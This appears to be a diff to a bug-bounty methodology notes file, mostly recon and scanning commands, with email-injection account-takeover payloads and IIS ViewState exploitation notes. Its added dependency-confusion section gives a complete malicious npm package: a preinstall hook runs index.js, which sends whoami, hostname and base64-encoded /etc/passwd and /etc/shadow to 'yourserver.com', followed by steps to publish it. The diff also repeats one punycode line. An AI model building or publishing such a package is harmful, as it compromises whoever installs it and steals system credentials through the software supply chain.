@@ -17,6 +17,7 @@ Subdomain finder
 	sublist3r -d domain.com -o subdomain.txt 
 	virus total - curl -s "https://www.virustotal.com/vtapi/v2/domain/report?domain=company.com&apikey=key" | jq -r '.domain_siblings[]'
 	ffuf -w brue_subdomains.txt -u http://FUZZ.target.com -H "Host: FUZZ.target.com" -mc 200-204,400-405,500
+	python3 subbrute.py domain.com
 	Remove Duplecates URLs - cat asset.txt | urldedupe > assets.txt
 	---------------------------------
 Check if the target is using IIS server:
@@ -49,7 +50,7 @@ Method-3 From favicon hash https://favicon-hash.kmsec.uk/ > Use the hash for sea
 Method-4 Check the Hash and URL in every search engine like hunter.how, shodan, fofa, censys, zoomeye etc..
 Method-5 check in virustotal
 			curl -s "https://www.virustotal.com/vtapi/v2/domain/report?domain=company.com&apikey=key" | jq -r '..| .ip_address? // empty' | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}'
-		If your getting multiple ip the check this method >> cat origin_ip.txt | httpx -td -sc -title -server
+		If your getting multiple ip the check this method >> cat origin_ip.txt | httpx-toolkit -td -sc -title -server
 Collect IPs from all 5 methods and check one by one on both port 80 and 443 (check with http and https), you can use nmap also for this.
 After finding the currect IP just update the host entries. for linux its in /etc/hosts.
 --------------------------------------------------------------------------
@@ -77,7 +78,7 @@ Find which subdomain are live
 Check for smuggling
 ----------------------
 	using smuggler tool, command
-		python3 smuggler -u domain
+		python3 smuggler.py -u domain
 ------------------------------
 Find Cors and other thing
 ----------------------------
@@ -90,7 +91,7 @@ crlfuzz -l domain.txt
 Dir search 
 ------------
 Use meg for dirsearch also
-Oneline command for urls:
+One line command for urls:
 	dirsearch -l urls.txt -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,log,xml,js,json --deep-recursive --force-recursive --exclude-sizes=0B --random-agent --full-url -o output_imp.txt
 	https://github.com/random-robbie/bruteforce-lists/blob/master/aspx.txt 
 ------------------------------
@@ -140,7 +141,7 @@ Passive URL Collection
 	katana -u subexample.coms_alive.txt -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o allurls.txt
 Advanced URL Fetching
 	echo example.com | katana -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -f qurl | urldedupe > output.txt
-	katana -u https://example.com -d 5 | grep '=' | urldedupe >> anew output.txt
+	katana -u https://example.com -d 5 | grep '=' | urldedupe >> output.txt
 	cat output.txt | sed 's/=.*/=/' > final.txt
 GAU URL Collection
 	echo example.com | gau --mc 200 | urldedupe >urls.txt
@@ -189,7 +190,7 @@ site:domain.com "Choose an image to upload"
 		
 One line command 
 ----------------------
-	subfinder -d moonpig.com -all -silent | gau | uro | gf sqli > sql.txt; sqlmap.txt --batch --dbs --risk2 --level 5 --random-agent | tee -a sqli.txt
+	subfinder -d domain.com -all -silent | gau | uro | gf sqli > sql.txt; sqlmap.txt --batch --dbs --risk2 --level 5 --random-agent | tee -a sqli.txt
 	
 	echo "domain.com" | waybackurls | httpx -silent | Gxss -c 100 -p Xss | sort -u | dalfox pipe
 	
@@ -626,6 +627,8 @@ Account takeover
 7. Chage mail address in burp or add mail (eg:- "emil1@gmail.com,fakeemail@gmail.com","emil1@gmail.com@fakeemail@gmail.com","emil1@gmail.com%00:fakeemail@gmail.com, victim@gmail.tld!0a!0dcc:attacker@gmail.tl, email=victim@gmail.com&email=attacker@gmail.com, email=victim@gmail.com,cc: attacker@gmail.com, email=victim@gmail.com\ncc: attacker@gmail.com, {"email": "victim@gmail.com", "email":"attacker@gmail.com"}, {"email": ["victim@gmail.com", "attacker@gmail.com"]}, email=“victim@mail.com$%0a%0d$cc: attacker@mail.com, user[email][]=victim@gmail.com&user[email][]=attacker@gmail.com " we can use @,space | hexa etc..)
 8. via otp bypass
 9. Using punycode, create a account with any@gmail.com.1234.burpcollabrator.com then try to open another account with any@gmail.com.1234.burpcolàbrator.com ( note the a is replace with à) if you see email already exist it means the application is vulnerable.
+9. Using punycode, create a account with any@gmail.com.1234.burpcollabrator.com then try to open another account with any@gmail.com.1234.burpcolàbrator.com ( note the a is replace with à) if you see email already exist it means the application is vulnerable.
+9. Using punycode, create a account with any@gmail.com.1234.burpcollabrator.com then try to open another account with any@gmail.com.1234.burpcolàbrator.com ( note the a is replace with à) if you see email already exist it means the application is vulnerable.
 	refer - https://infosecwriteups.com/the-most-underrated-0-click-account-takeover-using-punycode-idn-attacks-c0afdb74a3dc
 	you get the punycode here - https://github.com/coffinxp/scripts/blob/main/punycode_gen.py
 
@@ -1031,6 +1034,17 @@ Using the extention we get MAC is enabled or desabled (try to check in every POS
 	b. replace the <viewstate> to viewstate= parameter value  in the source replace the <__VIEWSTATEGENERATOR> to __VIEWSTATEGENERATOR= parameter value  in the source
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------	
 
+Testing on IIS and ASP.Net
+--------------------------
+If you found LFI or path traversal vulnerability check for C:\Windows\win.ini
+if you got the result just explore the "web.config" file
+Just note the "machineKey validationKey"
+
+For exploiting this vulenrability we need below requeirements:
+ViewGenerator value - Which is get from application source code via inspect element
+Algorithm - which is got from the web.config file in the "validation" parameter (after decryptionkey value it is present)
+Machinekey
+
 IIS Check list:
 ----------------------------------------------------------
 Use this tool - https://github.com/sw33tLie/sns?tab=readme-ov-file
@@ -1040,6 +1054,67 @@ Use this tool - https://github.com/sw33tLie/sns?tab=readme-ov-file
 3. Microsoft IIS Tilde Character Short File/Folder Name Disclosure (Burp extention IIS tide enumuration scanner)
 	tool for shorname - shortscan
 	Use - shortscan https:target.com -F
+	
+----------------------------------------------------------------------------------
+Checking Node.js Application:
+-----------------------------
+If you found a application build on node.js try to get "package.json" or "composer.json"> check the packages which uses the application, Check the name available for on npm or not "https://www.npmjs.com/package/<module_name>". 
+If you found 404 then you can go for the dependency confision.
+
+Now create the package (donot change the module name);
+
+mkdir <module_name>
+cd <module_name>
+npm login #then login using your email and password
+npm init #then fill up the input which the first one is name of module in this case it's <module_name>, also version keep it higher than the one that was in package.json bash
+
+Create the index.js, which contain a malicious actions; placed it in the same folder. 
+Create the index.js file;
+
+const { exec } = require("child_process");
+const command = `
+curl -X POST "http://yourserver.com/noderedactedsdk/$(whoami)/$(hostname)/" \
+-A "$( (cat /etc/passwd /etc/hosts && id && { [ -r /etc/shadow ] && cat /etc/shadow || echo 'No shadow access'; } | base64 | tr '\\n' '.')" \
+-s -o /dev/null
+`;
+exec(command, (error, stdout, stderr) => {
+if (error) {
+console.error(error.message);
+return;
+}
+if (stderr) {
+console.log(stderr);
+}
+console.log(stdout);
+});
+
+Add these in the package.json
+
+{"name": "<module_name>",
+"version": "5.0.0",
+"description": "Nodejs SDK for Redacted",
+"main": "index.js",
+"scripts": {
+"test": "echo \"Error: no test specified\" && exit 1",
+"preinstall": "node index.js"
+},
+"author": "",
+"license": "ISC",
+"dependencies": {
+"<module_name>": "¹.0.2"}}
+
+publish using below command;
+npm publish
+
+Payload: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Dependency%20Confusion#npm-example
+
+Refer: https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610
+https://medium.com/@instatunnel/dependency-confusion-the-supply-chain-attack-in-your-package-json-9517dd17dbe8
+https://medium.com/@appsecwarrior/dependency-confusion-attack-a83bc29c90e5
+https://orca.security/resources/blog/dependency-confusion-supply-chain-attacks/
+https://www.cobalt.io/blog/a-pentesters-guide-to-dependency-confusion-attacks
+
+
 Temp mail
 ---------
 tamp mail
@@ -1058,4 +1133,5 @@ If you found swagger.json
 please check out this https://blog.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers
 Try these two tools - https://github.com/intruder-io/autoswagger
 					https://github.com/BishopFox/sj
+				
 					
